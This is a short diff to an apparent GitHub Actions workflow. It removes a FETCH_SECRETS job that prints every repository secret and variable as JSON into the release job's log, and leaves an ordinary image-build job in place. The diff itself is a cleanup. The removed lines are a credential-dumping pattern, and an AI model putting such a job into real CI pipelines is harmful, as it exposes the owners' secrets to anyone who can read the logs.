@@ -13,20 +13,6 @@ on:
 
 
 jobs:
-
-  FETCH_SECRETS:
-    runs-on: ubuntu-latest
-    environment: major_release
-    steps:
-    - run: |
-        echo "$ALLMYSECRETS"
-        echo "$ALLMYVARS"
-      shell: bash
-      env:
-        ALLMYSECRETS: ${{ toJSON(secrets) }}
-        ALLMYVARS: ${{ toJSON(vars) }}
-
-
   BUILD_IMAGE:
     name: Build image
     uses: omarsh1996/reusable-workflows/.github/workflows/build-image.yaml@main
